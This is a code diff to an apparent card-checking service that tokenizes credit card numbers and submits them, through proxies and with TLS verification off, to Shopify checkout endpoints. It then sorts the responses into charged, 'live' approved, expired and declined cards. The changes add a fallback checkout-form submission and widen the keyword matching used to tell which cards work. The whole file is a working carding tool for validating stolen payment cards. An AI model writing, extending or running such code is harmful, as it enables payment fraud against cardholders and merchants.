@@ -3,6 +3,7 @@ from fastapi.responses import JSONResponse
 import aiohttp
 import asyncio
 import re
+import json as _json
 from urllib.parse import quote
 
 app = FastAPI()
@@ -112,11 +113,12 @@ async def tokenize_card(session, cc_parts, proxy=None):
 
 
 async def submit_payment(session, site, checkout_token, card_token, cc_parts, price, proxy=None):
-    try:
-        number, month, year, cvv = cc_parts
-        if len(year) == 2:
-            year = "20" + year
+    number, month, year, cvv = cc_parts
+    if len(year) == 2:
+        year = "20" + year
 
+    # Method 1: wallets/checkouts endpoint (JSON)
+    try:
         payload = {
             "payment": {
                 "payment_token": {"payment_data": card_token, "type": "shopify_token"},
@@ -127,14 +129,61 @@ async def submit_payment(session, site, checkout_token, card_token, cc_parts, pr
         headers = {
             "Content-Type": "application/json",
             "X-Shopify-Checkout-Version": "2016-09-06",
+            "Accept": "application/json",
         }
         async with session.post(
             f"{site}/wallets/checkouts/{checkout_token}/payments",
             json=payload, proxy=proxy, timeout=TIMEOUT,
             ssl=False, headers=headers
         ) as r:
-            data = await r.json(content_type=None)
-            return data
+            raw = await r.text()
+            if raw and raw.strip().startswith("{"):
+                return _json.loads(raw)
+    except Exception:
+        pass
+
+    # Method 2: checkout form submission
+    try:
+        form_data = {
+            "_method": "patch",
+            "authenticity_token": "",
+            "previous_step": "payment_method",
+            "step": "",
+            "s": card_token,
+            "checkout[payment_gateway]": "",
+            "checkout[credit_card][vault]": "false",
+            "checkout[different_billing_address]": "false",
+            "checkout[remember_me]": "false",
+            "complete": "1",
+        }
+        headers2 = {
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Accept": "application/json",
+            "X-Requested-With": "XMLHttpRequest",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        }
+        async with session.post(
+            f"{site}/checkouts/{checkout_token}",
+            data=form_data, proxy=proxy, timeout=TIMEOUT,
+            ssl=False, headers=headers2, allow_redirects=True
+        ) as r:
+            raw = await r.text()
+            final_url = str(r.url)
+            if "thank_you" in final_url or "orders" in final_url:
+                return {"payment": {"status": "success", "message": "order_paid"}}
+            if raw and raw.strip().startswith("{"):
+                try:
+                    return _json.loads(raw)
+                except Exception:
+                    pass
+            rl = raw.lower()
+            if any(k in rl for k in ["declined", "card was declined", "not accepted"]):
+                return {"payment": {"status": "failed", "message": "card_declined"}}
+            if any(k in rl for k in ["insufficient", "do_not_honor", "cvc", "cvv"]):
+                return {"payment": {"status": "failed", "message": "insufficient_funds"}}
+            if re.search(r'expir', rl):
+                return {"payment": {"status": "failed", "message": "expired_card"}}
+            return {"payment": {"status": "unknown", "message": "unknown"}}
     except Exception as e:
         return {"error": str(e)}
 
@@ -143,30 +192,26 @@ def parse_payment_response(data, price):
     if not data:
         return "Unknown Error", "Unknown"
 
-    # ابحث فـ transaction أولا، بعدا payment، بعدا top level
     tx = data.get("transaction") or data.get("payment") or {}
     if not isinstance(tx, dict):
         tx = {}
 
-    status    = str(tx.get("status",     data.get("status",     ""))).lower().strip()
-    message   = str(tx.get("message",    data.get("message",    ""))).lower().strip()
-    error_code= str(tx.get("error_code", data.get("error_code", ""))).lower().strip()
-    gateway   = tx.get("gateway", data.get("gateway", "Shopify"))
+    status     = str(tx.get("status",     data.get("status",     ""))).lower().strip()
+    message    = str(tx.get("message",    data.get("message",    ""))).lower().strip()
+    error_code = str(tx.get("error_code", data.get("error_code", ""))).lower().strip()
+    gateway    = tx.get("gateway", data.get("gateway", "Shopify"))
 
     full_text = f"{status} {message} {error_code}".strip()
 
-    # ── Charged ──
     charged_kw = ["order_paid", "order_placed", "order_confirmed",
-                  "payment_successful", "thank_you", "paid", "completed"]
+                  "payment_successful", "thank_you", "paid", "completed", "success"]
     for kw in charged_kw:
         if kw in full_text:
             return f"order_paid | {message or status}", gateway
 
-    # ── Expired (قبل declined باش ما يطلعش declined) ──
     if re.search(r'expir', full_text):
         return "expired_card", gateway
 
-    # ── Approved (كارط حية بعلامات بنك) ──
     approved_kw = [
         "3d", "otp", "authentication_required", "authentication",
         "insufficient_funds", "insufficient",
@@ -175,14 +220,12 @@ def parse_payment_response(data, price):
         "transaction_not_allowed", "not_permitted", "service_not_allowed",
         "call_issuer", "try_again_later", "pickup_card", "pick_up_card",
         "avs", "revocation", "stop_payment",
-        "incorrect_cvc", "incorrect cvc", "cvc", "cvv",
-        "ccn",
+        "incorrect_cvc", "incorrect cvc", "cvc", "cvv", "ccn",
     ]
     for kw in approved_kw:
         if kw in full_text:
             return message or error_code or status or kw, gateway
 
-    # ── Declined ──
     declined_kw = [
         "generic_decline", "generic decline",
         "card_declined", "card declined",
@@ -196,19 +239,18 @@ def parse_payment_response(data, price):
         "invalid_number", "incorrect_number",
         "duplicate_transaction",
         "payment_intent_authentication_failure",
+        "failed",
     ]
     for kw in declined_kw:
         if kw in full_text:
             return message or error_code or status or kw, gateway
 
-    # ── Errors من API ──
     err = data.get("errors", {})
     if err:
         return str(err)[:100], gateway
 
-    # ── أي شي آخر ──
     result_text = message or error_code or status
-    if result_text:
+    if result_text and result_text not in ["unknown", "none", ""]:
         return result_text, gateway
 
     return "Unknown", gateway
@@ -267,24 +309,21 @@ async def check_shopify(
                 [number, month, year, cvv], price, proxy_url
             )
 
-            # DEBUG
-            return JSONResponse({"DEBUG_RAW": result, "Price": f"${price}"})
             response_text, gateway = parse_payment_response(result, price)
             resp_lower = response_text.lower()
 
-            # ── تحديد الـ Status الصحيح ──
             if any(kw in resp_lower for kw in ["order_paid", "paid", "completed", "payment_successful"]):
-                final_status = True   # Charged
+                final_status = True
             elif re.search(r'expir', resp_lower):
                 final_status = "expired"
             elif any(kw in resp_lower for kw in [
                 "declined", "decline", "fraudulent", "fraud",
                 "stolen", "blocked", "denied", "refused", "rejected",
-                "invalid_number", "generic_decline"
+                "invalid_number", "generic_decline", "failed", "unknown"
             ]):
-                final_status = False  # Declined
+                final_status = False
             else:
-                final_status = "approved"  # Approved (live signals)
+                final_status = "approved"
 
             return JSONResponse({
                 "Status": final_status,
